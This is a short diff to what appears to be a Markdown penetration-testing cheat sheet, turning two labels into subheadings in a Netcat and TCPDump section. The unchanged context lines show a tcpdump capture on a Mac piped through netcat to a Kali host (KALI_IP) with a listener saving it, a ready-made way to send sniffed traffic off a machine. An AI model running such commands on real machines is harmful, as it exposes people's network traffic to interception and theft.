@@ -31,14 +31,14 @@ Bash: (root)
 
 ## Netcat & TCPDump:
 
-Data in file:
+### Data in file:
 
 Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic:
 
 	/usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)
 	nc -l -p 7777 | tee /tmp/sniffed_output.pcapng (on kali)
 
-Data in real time:
+### Data in real time:
 
 On kali:
 
